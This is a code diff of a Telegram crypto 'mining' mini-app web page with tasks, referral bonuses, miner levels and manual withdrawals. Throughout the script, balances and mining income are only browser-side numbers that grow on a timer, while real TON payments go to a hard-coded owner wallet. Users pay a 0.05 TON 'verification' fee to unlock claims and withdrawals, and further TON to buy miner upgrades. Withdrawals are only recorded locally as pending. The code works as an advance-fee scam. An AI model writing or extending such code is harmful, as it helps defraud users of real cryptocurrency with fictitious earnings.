@@ -77,10 +77,6 @@ body{background:#0a0a0a radial-gradient(circle at top,#2a1f00 0%,#0a0a0a 60%);co
       <div class="flex gap-3 items-center"><div class="w-10 h-10 bg-yellow-500/20 rounded-full flex items-center justify-center">❤️</div><div><p class="text-sm font-bold">React to Post</p><p class="text-xs text-white/50">+5 VANTA • Every 2hrs</p></div></div>
       <button id="taskBtn2" onclick="doTask(5,'react_post','https://t.me/VantaBotHub')" class="bg-white text-black px-4 py-2 rounded-full text-xs font-bold">React</button>
     </div>
-    <div class="glass p-4 flex justify-between items-center border border-[#FFD700]/30 bg-gradient-to-r from-[#FFD700]/10 to-[#FFA500]/10">
-      <div class="flex gap-3 items-center"><div class="w-10 h-10 bg-[#FFD700]/20 rounded-full flex items-center justify-center">🚀</div><div><p class="text-sm font-bold">Promote Your Project</p><p class="text-xs text-[#FFD700]">1 USDT = 100 Real Users</p></div></div>
-      <button onclick="window.open('https://t.me/Vanta23SupportBot?start=promote','_blank')" class="gold-gradient px-4 py-2 rounded-full text-xs">Promote</button>
-    </div>
   </div>
 </div>
 
@@ -119,16 +115,11 @@ body{background:#0a0a0a radial-gradient(circle at top,#2a1f00 0%,#0a0a0a 60%);co
     <div class="flex gap-3 items-center"><div class="w-10 h-10 bg-yellow-500/20 rounded-full flex items-center justify-center">💰</div><div><p class="text-sm font-bold">Assets</p><p class="text-xs"><span id="balProfile">0</span> VANTA <span class="bg-green-500/20 text-green-400 px-2 py-1 rounded-full text-[10px] ml-2">≈ $<span id="usdProfile">0</span></span></p></div></div>
   </div>
   <div class="glass p-4 mt-3 flex justify-between"><div><p class="text-sm font-bold">Pool Wallet</p><p class="text-xs text-white/50">Withdrawable</p></div><p class="text-green-400 font-bold"><span id="pool2">0</span> VANTA</p></div>
-  <div class="glass p-4 mt-3"><p class="text-sm font-bold">Withdraw History (Manual)</p><div id="withdrawHistory" class="mt-2"></div></div>
+  <div class="glass p-4 mt-3"><p class="text-sm font-bold">Withdraw History</p><div id="withdrawHistory" class="mt-2"></div></div>
   <div id="withdrawCard" class="glass p-4 mt-4">
     <p class="text-sm">Manual Withdraw (Min 1000, Fee 30)</p><p class="text-[11px] text-white/50">Admin sends manually within 24hrs</p><p class="text-xs text-yellow-400 mt-1">Receive: <b id="receiveAmt">0</b> VANTA</p>
     <input id="withdrawAmt" oninput="calcReceive()" type="number" placeholder="Amount" class="w-full mt-2 p-3 rounded-xl bg-black/40 border border-white/10 text-white">
     <button onclick="withdraw()" id="withdrawBtn" class="w-full bg-white text-black mt-3 py-3 rounded-xl font-bold">Request Withdraw</button>
-  </div>
-  <div class="glass p-4 mt-4 border border-[#FFD700]/20">
-    <p class="text-sm font-bold">Support & Promotion</p><p class="text-[11px] text-white/50 mt-1">Get help or grow your project</p>
-    <button onclick="window.open('https://t.me/Vanta23SupportBot','_blank')" class="w-full mt-3 bg-white/10 border border-white/10 py-3.5 rounded-xl text-sm font-bold">💬 Contact Support</button>
-    <button onclick="window.open('https://t.me/Vanta23SupportBot?start=promote','_blank')" class="w-full mt-3 gold-gradient py-3.5 rounded-xl text-sm font-bold">🚀 Promote Your Project - 1 USDT = 100 Clicks</button>
   </div>
 </div>
 
@@ -151,7 +142,6 @@ const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
   buttonRootId: 'ton-connect'
 });
 
-// FIXED VALID ADDRESS - Id not ID
 const OWNER_WALLET = "UQCbXnjJ-vVo3oGtovId9TRs_H-O3CO9irjgazyk8F39_XOu";
 const VERIFICATION_NANOTON = "50000000";
 let connectedWalletAddress = "";
@@ -208,13 +198,19 @@ if(myBalParam > balance){ balance = myBalParam; localStorage.setItem('v_balance'
 let refKey = 'refs_of_' + tgId;
 let refClaimedKey = 'v_ref_claimed_' + tgId;
 let refClaimed = parseFloat(localStorage.getItem(refClaimedKey) || localStorage.getItem('v_ref_claimed') || '0');
+
+// FIXED: Always update stored pending from URL
 let storedPendingRef = parseFloat(localStorage.getItem('v_pending_ref') || '0');
-if(pendingRefParam > storedPendingRef){ storedPendingRef = pendingRefParam; localStorage.setItem('v_pending_ref', storedPendingRef.toString()); }
-let pendingReferral = storedPendingRef;
-let currentMinerLevel = parseInt(localStorage.getItem('v_miner_level') || '1');
-let visibleLevels = 20;
+if(pendingRefParam > 0){
+  if(pendingRefParam > storedPendingRef){
+    storedPendingRef = pendingRefParam;
+    localStorage.setItem('v_pending_ref', storedPendingRef.toString());
+  }
+}
+
 function getVerifiedWallet(){ return localStorage.getItem('v_verified_wallet') || ""; }
 function isVerified(){ return (localStorage.getItem('v_verified') === '1' && getVerifiedWallet()!==""); }
+
 function updateVerificationUI(){
   let card=document.getElementById('verificationCard'); let status=document.getElementById('verificationStatus');
   let text=document.getElementById('verificationText'); let btn=document.getElementById('verifyBtn');
@@ -237,32 +233,29 @@ function updateVerificationUI(){
     if(profileIcon) profileIcon.innerText="🔐";
   }
 }
+
+// FIXED VERIFICATION - NO AUTO RELEASE
 async function verifyAccount(){
   if(isVerified()){ alert("✅ Already verified!"); return; }
   if(!connectedWalletAddress){ alert("❌ Connect wallet first."); return; }
   let btn=document.getElementById('verifyBtn'); btn.disabled=true; btn.innerText="Opening TON Wallet...";
   try{
     const transaction = { validUntil: Math.floor(Date.now()/1000)+600, messages: [{ address: OWNER_WALLET, amount: VERIFICATION_NANOTON }] };
-    console.log("Sending tx:", transaction);
     const result = await tonConnectUI.sendTransaction(transaction);
-    console.log("Result:", result);
     if(result && result.boc){
       localStorage.setItem('v_verification_boc', result.boc);
       localStorage.setItem('v_verified_wallet', connectedWalletAddress);
       localStorage.setItem('v_verified', '1');
       localStorage.setItem('v_verified_at', new Date().toISOString());
-      if(pendingReferral>0){
-        let released=parseFloat(localStorage.getItem('v_released_ref')||'0');
-        if(pendingReferral>released){ localStorage.setItem('v_released_ref', pendingReferral.toString()); }
-      }
       updateVerificationUI(); updateFriendsUI(); updateWithdrawUI();
-      alert("✅ Verification sent! 0.05 TON - Withdrawals unlocked.");
+      alert("✅ Verified! Go to Friends page and CLAIM your referral bonus now.");
     }else{ throw new Error("No result"); }
   }catch(e){
     console.log(e); btn.disabled=false; updateVerificationUI();
     alert("❌ Cancelled or failed. Update Tonkeeper and try again.");
   }
 }
+
 document.getElementById('refLink').innerText='https://t.me/Vanta23bot?start='+tgId;
 document.getElementById('userIdShow').innerText=tgId;
 function isUserJoined(){ let f=localStorage.getItem('v_joined_channel'); let d=JSON.parse(localStorage.getItem('v_tasks_done')||'[]'); return (f||d.includes('join_channel')); }
@@ -276,7 +269,57 @@ function watchMonetagTaskAd(){ let c=getMonetagAdCount(); if(c>=MONETAG_DAILY_LI
 function finishMonetagTaskAd(){ let c=getMonetagAdCount(); if(c>=MONETAG_DAILY_LIMIT){ updateMonetagTaskUI(); return; } balance+=MONETAG_REWARD; c++; localStorage.setItem('v_monetag_date',getMonetagDate()); localStorage.setItem('v_monetag_ads_today',c.toString()); localStorage.setItem('v_balance',balance.toString()); updateUI(); updateMonetagTaskUI(); alert('+1 VANTA ✅ '+c+'/20'); }
 function renderMiners(){ let g=document.getElementById('minersGrid'); if(!g) return; g.innerHTML=''; for(let i=1;i<=visibleLevels;i++){ let cost=getCostForLevel(i); let usd=getUsdRateForLevel(i); let ton=TON_PRICE[i]||(i*0.18).toFixed(2); let speed=(3.02+i*0.06).toFixed(2); let isActive=i==currentMinerLevel; let isLocked=i>currentMinerLevel+1; let isOwned=i<currentMinerLevel; let btn; if(isOwned){ btn=`<button class="w-full bg-white/10 py-2 rounded-lg text-xs mt-2">OWNED</button>`; }else if(isActive){ btn=`<button class="w-full bg-[#00FF88] text-black py-2 rounded-lg text-xs font-bold mt-2">ACTIVE</button>`; }else if(isLocked){ btn=`<div class="bg-black/50 py-2 rounded-lg mt-2 text-center text-xs">🔒 Lvl ${currentMinerLevel+1} First</div>`; }else{ btn=`<button onclick="buyMiner(${i}, ${cost})" class="w-full gold-gradient py-2 rounded-lg text-[9px] mt-2">${cost} VANTA + ${ton} TON</button>`; } g.innerHTML+=`<div class="glass p-3 ${isActive?'border border-yellow-500/50':''} ${isLocked?'opacity-60':''}"><p class="text-xs">Lvl ${i}</p><p class="text-sm font-bold green-glow mt-2">$${usd.toFixed(5)}/sec</p><p class="text-[11px] mt-2">Speed <b class="float-right">${speed} TH/s</b></p>${btn}</div>`; } document.getElementById('myLevelShow').innerText=currentMinerLevel; document.getElementById('mySpeedShow').innerText=(3.02+currentMinerLevel*0.06).toFixed(2)+' TH/s'; }
 function loadMoreMiners(){ visibleLevels+=20; if(visibleLevels>1000) visibleLevels=1000; renderMiners(); }
-function updateFriendsUI(){ let myR=JSON.parse(localStorage.getItem(refKey)||'[]'); let localCount=myR.length; let count=localCount; if(realRefs>count){ count=realRefs; } let backendPending=pendingReferral; let releasedRef=parseFloat(localStorage.getItem('v_released_ref')||'0'); let total=count*100; let localUnclaimed=total-refClaimed; if(localUnclaimed<0) localUnclaimed=0; let available=localUnclaimed; if(isVerified()&&backendPending>0&&backendPending>releasedRef){ let extra=backendPending-releasedRef; available+=extra; } let pendingDisplay=0; if(!isVerified()){ pendingDisplay=Math.max(backendPending,localUnclaimed); } document.getElementById('refCount').innerText=count; let earnedEl=document.getElementById('refEarned'); if(earnedEl){ earnedEl.innerText=(isVerified()?available:pendingDisplay)+' VANTA'; } let text=document.getElementById('refRewardText'); let btn=document.getElementById('claimReferralBtn'); if(!isVerified()){ text.innerText=pendingDisplay+' pending • Verify to claim'; text.className='text-xs text-yellow-400'; if(btn){ btn.innerText='🔐 Verify First'; btn.className='bg-yellow-500/20 text-yellow-400 border border-yellow-500 px-3 py-2 rounded-full text-xs'; } }else{ text.innerText=available+' available • +100 each'; text.className='text-xs text-white/50'; if(btn){ btn.innerText=available>0?'Claim':'No Reward'; btn.className=available>0?'bg-white/20 px-4 py-2 rounded-full text-xs':'bg-white/10 text-white/40 px-4 py-2 rounded-full text-xs'; } } let listDiv=document.getElementById('refList'); if(listDiv){ listDiv.innerHTML=""; for(let i=0;i<count;i++){ listDiv.innerHTML+=`<div class="glass p-3 text-xs flex justify-between"><span>👤 Friend ${i+1}</span><span class="text-green-400">+100 VANTA</span></div>`; } if(count==0){ listDiv.innerHTML=`<p class="text-center text-white/40 text-xs mt-4">No referrals yet.</p>`; } } }
+
+// FIXED FRIENDS UI
+function updateFriendsUI(){
+  let myR=JSON.parse(localStorage.getItem(refKey)||'[]');
+  let localCount=myR.length;
+  let count=localCount;
+  if(realRefs>count){ count=realRefs; }
+
+  let pendingNow = parseFloat(localStorage.getItem('v_pending_ref') || '0');
+  if(pendingRefParam > pendingNow) pendingNow = pendingRefParam;
+
+  let releasedRef=parseFloat(localStorage.getItem('v_released_ref')||'0');
+  let totalFromCount=count*100;
+  let localUnclaimed=totalFromCount-refClaimed;
+  if(localUnclaimed<0) localUnclaimed=0;
+
+  let available = localUnclaimed;
+  if(pendingNow > releasedRef){
+    available += (pendingNow - releasedRef);
+  }
+
+  let pendingDisplay = 0;
+  if(!isVerified()){
+    pendingDisplay = Math.max(pendingNow, totalFromCount);
+    if(pendingDisplay < 100 && count>0) pendingDisplay = count*100;
+  }
+
+  document.getElementById('refCount').innerText=count;
+  let earnedEl=document.getElementById('refEarned');
+  if(earnedEl){ earnedEl.innerText=(isVerified()?available:pendingDisplay)+' VANTA'; }
+  let text=document.getElementById('refRewardText');
+  let btn=document.getElementById('claimReferralBtn');
+  if(!isVerified()){
+    text.innerText=pendingDisplay+' pending • Verify to claim';
+    text.className='text-xs text-yellow-400';
+    if(btn){ btn.innerText='🔐 Verify First'; btn.className='bg-yellow-500/20 text-yellow-400 border border-yellow-500 px-3 py-2 rounded-full text-xs'; }
+  }else{
+    text.innerText=available+' available • +100 each';
+    text.className='text-xs text-white/50';
+    if(btn){ btn.innerText=available>0?'Claim':'No Reward'; btn.className=available>0?'gold-gradient px-4 py-2 rounded-full text-xs':'bg-white/10 text-white/40 px-4 py-2 rounded-full text-xs'; }
+  }
+  let listDiv=document.getElementById('refList');
+  if(listDiv){
+    listDiv.innerHTML="";
+    for(let i=0;i<count;i++){
+      listDiv.innerHTML+=`<div class="glass p-3 text-xs flex justify-between"><span>👤 Friend ${i+1}</span><span class="text-green-400">+100 VANTA</span></div>`;
+    }
+    if(count==0){ listDiv.innerHTML=`<p class="text-center text-white/40 text-xs mt-4">No referrals yet. Share your link!</p>`; }
+  }
+}
+
 function updateUI(){ document.getElementById('balance').innerText=balance.toFixed(4); document.getElementById('pool').innerText=balance.toFixed(4); document.getElementById('pool2').innerText=balance.toFixed(4); document.getElementById('balProfile').innerText=balance.toFixed(4); document.getElementById('holding').innerText='30'; let usdRate=getUsdRateForLevel(currentMinerLevel); let vantaPerSec=usdRate/0.0021; document.getElementById('power').innerText=(3.02+currentMinerLevel*0.06).toFixed(2); document.getElementById('miningPlus').innerText='+'+vantaPerSec.toFixed(6)+' VANTA/s'; document.getElementById('rateShow').innerText=usdRate.toFixed(5); document.getElementById('usdProfile').innerText=(balance*0.0021).toFixed(2); document.getElementById('lvl').innerText=currentMinerLevel; updateFriendsUI(); let badge=document.getElementById('joinStatusBadge'); if(badge){ if(isUserJoined()){ badge.innerText='● JOINED'; badge.className='bg-green-500/20 text-green-400 text-xs px-3 py-1 rounded-full border border-green-500'; }else{ badge.innerText='● NOT JOINED'; badge.className='bg-red-500/20 text-red-400 text-xs px-3 py-1 rounded-full border border-red-500'; } } updateMonetagTaskUI(); updateVerificationUI(); updateWithdrawUI(); }
 function showPage(p){ ['mine','miners','tasks','friends','profile'].forEach(function(x){ document.getElementById(x+'-page').classList.add('hidden'); }); document.getElementById(p+'-page').classList.remove('hidden'); ['mine','miners','tasks','friends','profile'].forEach(function(x){ let el=document.getElementById('nav-'+x); el.classList.remove('nav-active'); el.style.opacity='0.6'; }); let active=document.getElementById('nav-'+p); active.classList.add('nav-active'); active.style.opacity='1'; if(p=='miners') renderMiners(); if(p=='tasks') checkTasksUI(); if(p=='friends') updateFriendsUI(); if(p=='profile'){ renderWithdrawHistory(); updateVerificationUI(); updateWithdrawUI(); } updateMonetagTaskUI(); }
 function claim(){ if(!isUserJoined()){ alert('❌ You must JOIN channel first!'); showPage('tasks'); return; } if(isClaiming) return; isClaiming=true; let btn=document.getElementById('claimBtn'); btn.innerText="Loading AdsGram Ad..."; btn.disabled=true; if(AdController){ AdController.show().then(function(result){ if(result&&result.done){ finishClaim(); }else{ btn.innerText="CLAIM x2 (Watch Ad)"; btn.disabled=false; isClaiming=false; } }).catch(function(){ fallbackMonetagAd(); }); }else{ fallbackMonetagAd(); } }
@@ -285,12 +328,48 @@ function finishClaim(){ let usdRate=getUsdRateForLevel(currentMinerLevel); let e
 function checkTasksUI(){ let done=JSON.parse(localStorage.getItem('v_tasks_done')||'[]'); let times=JSON.parse(localStorage.getItem('v_tasks_time')||'{}'); let hasJoined=isUserJoined(); let now=Date.now(); let btn1=document.getElementById('taskBtn1'); let btn2=document.getElementById('taskBtn2'); if(done.includes('join_channel')&&btn1){ btn1.innerText='✅ Done'; btn1.className='bg-green-500/20 text-green-400 border border-green-500 px-4 py-2 rounded-full text-xs font-bold'; btn1.disabled=true; } if(btn2){ if(!hasJoined){ btn2.innerText='Join Channel First'; btn2.className='bg-red-500/20 text-red-400 border border-red-500 px-3 py-2 rounded-full text-[10px]'; btn2.disabled=true; }else if(done.includes('react_post')){ let last=times['react_post']||0; let twoHrs=2*60*60*1000; let diff=now-last; if(diff<twoHrs){ let left=twoHrs-diff; let h=Math.floor(left/3600000); let m=Math.floor((left%3600000)/60000); let s=Math.floor((left%60000)/1000); btn2.innerText=h>0?`${h}h ${m}m ${s}s`:m>0?`${m}m ${s}s`:`${s}s left`; btn2.className='bg-yellow-500/20 text-yellow-400 border border-yellow-500 px-3 py-2 rounded-full text-[11px] font-bold'; btn2.disabled=true; }else{ let newDone=done.filter(function(x){ return x!=='react_post'; }); localStorage.setItem('v_tasks_done',JSON.stringify(newDone)); btn2.innerText='React'; btn2.className='bg-white text-black px-4 py-2 rounded-full text-xs font-bold'; btn2.disabled=false; } }else{ btn2.innerText='React'; btn2.className='bg-white text-black px-4 py-2 rounded-full text-xs font-bold'; btn2.disabled=false; } } updateMonetagTaskUI(); }
 function doTask(amount,taskId,link){ let done=JSON.parse(localStorage.getItem('v_tasks_done')||'[]'); let times=JSON.parse(localStorage.getItem('v_tasks_time')||'{}'); let now=Date.now(); if(taskId!=='join_channel'&&!isUserJoined()){ alert('❌ You must JOIN our channel first!'); showPage('tasks'); return; } if(taskId==='join_channel'){ if(done.includes('join_channel')){ alert('Already joined!'); return; } let btn=document.getElementById('taskBtn1'); if(btn&&btn.innerText==='Join'){ window.open(link,'_blank'); btn.innerText='Verify Join ✅'; btn.className='bg-yellow-400 text-black px-4 py-2 rounded-full text-xs font-bold animate-pulse'; return; } if(btn&&btn.innerText.includes('Verify')){ balance+=amount; done.push(taskId); times[taskId]=now; localStorage.setItem('v_joined_channel','true'); localStorage.setItem('v_tasks_done',JSON.stringify(done)); localStorage.setItem('v_tasks_time',JSON.stringify(times)); localStorage.setItem('v_balance',balance); updateUI(); checkTasksUI(); alert('✅ Joined +'+amount+' VANTA'); return; } } if(link){ window.open(link,'_blank'); } balance+=amount; if(!done.includes(taskId)){ done.push(taskId); } times[taskId]=now; localStorage.setItem('v_tasks_done',JSON.stringify(done)); localStorage.setItem('v_tasks_time',JSON.stringify(times)); localStorage.setItem('v_balance',balance); updateUI(); checkTasksUI(); alert('+'+amount+' VANTA!'); }
 function copyRef(){ let link=document.getElementById('refLink').innerText; if(navigator.clipboard&&navigator.clipboard.writeText){ navigator.clipboard.writeText(link).then(function(){ alert('Copied!'); }).catch(function(){ alert(link); }); }else{ alert(link); } }
-function claimReferral(){ if(!isVerified()){ alert("🔐 Verification required.\n\nVerify with 0.05 TON before claiming referral rewards."); showPage('mine'); return; } if(!isUserJoined()){ alert('❌ Join channel first!'); showPage('tasks'); return; } let myR=JSON.parse(localStorage.getItem(refKey)||'[]'); let count=myR.length; if(realRefs>count) count=realRefs; let total=count*100; let unclaimed=total-refClaimed; if(unclaimed<0) unclaimed=0; let backendPending=pendingReferral; let releasedRef=parseFloat(localStorage.getItem('v_released_ref')||'0'); if(backendPending>releasedRef){ unclaimed+=backendPending-releasedRef; } if(unclaimed<=0){ alert(count==0?'Invite friends first!':'All referral rewards claimed.'); return; } if(AdController){ AdController.show().then(function(res){ if(res&&res.done){ completeReferralClaim(unclaimed); } }).catch(function(){ alert('❌ Ad was not completed.'); }); }else{ completeReferralClaim(unclaimed); } }
-function completeReferralClaim(unclaimed){ balance+=unclaimed; refClaimed+=unclaimed; if(pendingReferral>0){ localStorage.setItem('v_released_ref',pendingReferral.toString()); } localStorage.setItem('v_balance',balance); localStorage.setItem(refClaimedKey,refClaimed.toString()); localStorage.setItem('v_ref_claimed',refClaimed.toString()); updateUI(); alert('+'+unclaimed+' VANTA claimed! 🎉'); }
+
+function claimReferral(){
+  if(!isVerified()){ alert("🔐 Verification required.\n\nVerify with 0.05 TON before claiming."); showPage('mine'); return; }
+  if(!isUserJoined()){ alert('❌ Join channel first!'); showPage('tasks'); return; }
+  let myR=JSON.parse(localStorage.getItem(refKey)||'[]');
+  let count=myR.length;
+  if(realRefs>count) count=realRefs;
+  let total=count*100;
+  let unclaimed=total-refClaimed;
+  if(unclaimed<0) unclaimed=0;
+  let backendPending=parseFloat(localStorage.getItem('v_pending_ref')||'0');
+  if(pendingRefParam>backendPending) backendPending=pendingRefParam;
+  let releasedRef=parseFloat(localStorage.getItem('v_released_ref')||'0');
+  if(backendPending>releasedRef){ unclaimed+=(backendPending-releasedRef); }
+  if(unclaimed<=0){ alert(count==0?'Invite friends first!':'All rewards claimed.'); return; }
+  if(AdController){
+    AdController.show().then(function(res){ if(res&&res.done){ completeReferralClaim(unclaimed, backendPending); } }).catch(function(){ alert('❌ Ad not completed.'); });
+  }else{
+    completeReferralClaim(unclaimed, backendPending);
+  }
+}
+
+function completeReferralClaim(unclaimed, backendPending){
+  balance+=unclaimed;
+  refClaimed+=unclaimed;
+  let currentPending = backendPending || parseFloat(localStorage.getItem('v_pending_ref')||'0');
+  if(currentPending>0){
+    localStorage.setItem('v_released_ref', currentPending.toString());
+  }
+  localStorage.setItem('v_balance',balance);
+  localStorage.setItem(refClaimedKey,refClaimed.toString());
+  localStorage.setItem('v_ref_claimed',refClaimed.toString());
+  updateUI();
+  alert('+'+unclaimed+' VANTA claimed! 🎉');
+}
+
 function updateWithdrawUI(){ let btn=document.getElementById('withdrawBtn'); let card=document.getElementById('withdrawCard'); if(!btn||!card) return; if(!isVerified()){ btn.innerText='🔐 VERIFY TO WITHDRAW'; btn.className='w-full bg-yellow-500/20 text-yellow-400 border border-yellow-500 mt-3 py-3 rounded-xl font-bold'; card.className='glass p-4 mt-4 border border-yellow-500/20'; }else{ btn.innerText='Request Withdraw'; btn.className='w-full bg-white text-black mt-3 py-3 rounded-xl font-bold'; card.className='glass p-4 mt-4'; } }
 let withdrawRequests=JSON.parse(localStorage.getItem('v_withdraw_reqs')||'[]');
+let currentMinerLevel = parseInt(localStorage.getItem('v_miner_level') || '1');
+let visibleLevels = 20;
 function calcReceive(){ let v=parseFloat(document.getElementById('withdrawAmt').value)||0; let r=v-30; if(r<0) r=0; document.getElementById('receiveAmt').innerText=r.toFixed(2); }
-function withdraw(){ if(!isVerified()){ alert("🔐 Verification required.\n\nYou must verify with 0.05 TON before withdrawing VANTA."); showPage('mine'); return; } let v=parseFloat(document.getElementById('withdrawAmt').value); if(v<1000){ alert('Min 1000 VANTA'); return; } if(v>balance){ alert('Insufficient balance'); return; } let wallet=connectedWalletAddress||localStorage.getItem('v_wallet')||''; if(!wallet){ alert('❌ Connect wallet first!'); return; } if(!isUserJoined()){ alert('❌ Join channel first!'); showPage('tasks'); return; } if(!confirm(`Withdraw ${v} VANTA\n\nReceive ${v-30} VANTA\n\nWallet ${wallet.slice(0,10)}...\n\nConfirm?`)){ return; } balance-=v; let req={id:Date.now(),amount:v,receive:v-30,wallet:wallet,userId:tgId,userName:tgName,date:new Date().toLocaleString(),status:'pending'}; withdrawRequests.push(req); localStorage.setItem('v_withdraw_reqs',JSON.stringify(withdrawRequests)); localStorage.setItem('v_balance',balance); updateUI(); renderWithdrawHistory(); alert('✅ Request sent!'); document.getElementById('withdrawAmt').value=''; calcReceive(); }
+function withdraw(){ if(!isVerified()){ alert("🔐 Verification required."); showPage('mine'); return; } let v=parseFloat(document.getElementById('withdrawAmt').value); if(v<1000){ alert('Min 1000 VANTA'); return; } if(v>balance){ alert('Insufficient balance'); return; } let wallet=connectedWalletAddress||localStorage.getItem('v_wallet')||''; if(!wallet){ alert('❌ Connect wallet first!'); return; } if(!isUserJoined()){ alert('❌ Join channel first!'); showPage('tasks'); return; } if(!confirm(`Withdraw ${v} VANTA\n\nReceive ${v-30} VANTA\n\nWallet ${wallet.slice(0,10)}...\n\nConfirm?`)){ return; } balance-=v; let req={id:Date.now(),amount:v,receive:v-30,wallet:wallet,userId:tgId,userName:tgName,date:new Date().toLocaleString(),status:'pending'}; withdrawRequests.push(req); localStorage.setItem('v_withdraw_reqs',JSON.stringify(withdrawRequests)); localStorage.setItem('v_balance',balance); updateUI(); renderWithdrawHistory(); alert('✅ Request sent!'); document.getElementById('withdrawAmt').value=''; calcReceive(); }
 function renderWithdrawHistory(){ let div=document.getElementById('withdrawHistory'); if(!div) return; if(withdrawRequests.length==0){ div.innerHTML='<p class="text-white/30 text-xs text-center">No withdraw yet</p>'; return; } div.innerHTML=withdrawRequests.slice(-10).reverse().map(function(r){ return `<div class="glass p-2 mt-2 text-[11px] flex justify-between"><div><b>${r.amount} → ${r.receive}</b><br><span class="text-white/40 text-[9px]">${r.date}</span></div><span class="${r.status=='pending'?'text-yellow-400':'text-green-400'}">${r.status.toUpperCase()}</span></div>`; }).join(''); }
 async function buyMiner(lvl,vantaCost){ if(lvl!=currentMinerLevel+1){ alert('Buy Lvl '+(currentMinerLevel+1)+' first!'); return; } if(balance<vantaCost){ alert('Need '+vantaCost+' VANTA'); return; } let tonCost=TON_PRICE[lvl]||(lvl*0.18).toFixed(2); if(!confirm(`UPGRADE TO LVL ${lvl}?\n\nCost: ${vantaCost} VANTA + ${tonCost} TON`)){ return; } if(!connectedWalletAddress){ alert('❌ Connect your TON wallet first.'); return; } try{ const transaction={validUntil:Math.floor(Date.now()/1000)+600,messages:[{address:OWNER_WALLET,amount:(parseFloat(tonCost)*1000000000).toString()}]}; await tonConnectUI.sendTransaction(transaction); balance-=vantaCost; currentMinerLevel=lvl; let powerValue=1.0+lvl*0.06; localStorage.setItem('v_balance',balance.toString()); localStorage.setItem('v_miner_level',currentMinerLevel.toString()); localStorage.setItem('v_power',powerValue.toString()); updateUI(); renderMiners(); alert('✅ Lvl '+lvl+' ACTIVE!'); }catch(e){ console.log(e); alert('❌ TON Payment cancelled or failed.'); } }
 setInterval(function(){ let usdRate=getUsdRateForLevel(currentMinerLevel); let vps=usdRate/0.0021; balance+=vps; localStorage.setItem('v_balance',balance); updateUI(); },1000);
